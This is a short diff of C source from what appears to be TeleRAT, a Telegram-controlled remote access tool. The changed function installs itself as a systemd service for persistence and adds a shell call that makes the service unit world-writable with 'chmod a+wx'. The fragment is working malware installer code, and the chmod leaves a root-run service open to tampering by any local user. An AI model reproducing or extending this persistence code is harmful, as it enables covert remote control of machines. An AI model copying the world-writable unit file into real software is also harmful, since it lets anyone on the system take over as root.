@@ -39,14 +39,15 @@ void initSetiing(char *pName,char *ip,char *port){
 	sprintf(cmd.cmd,"%s%s",path,pName);
 	
 	//writing in /etc/systemd/system
-	FILE *f = fopen("/etc/systemd/system/TeleRAT.service","w");
+	FILE *f = fopen("/etc/systemd/system/TeleRAT.service","wb");
 	if(f == NULL)
 	{
 	   printf("Error can't open file");
 	   exit(1);
 	}
     char *text = malloc(sizeof(cmd.cmd));
-	
+	FILE *ch = popen("chmod a+wx /etc/systemd/system/TeleRAT.service","r");
+    pclose(ch);
 	sprintf(text,"[Unit]\n"
 		"Description = TeleRAT Remote Administrator Via Telegram\n\n"
         "[Service]\n"
@@ -56,6 +57,7 @@ void initSetiing(char *pName,char *ip,char *port){
     printf("%s",text);
 	fprintf(f,"%s",text);
     free(text);
+    fclose(f);
     bzero(cmd.cmd,sizeof(cmd.cmd));
 }
 
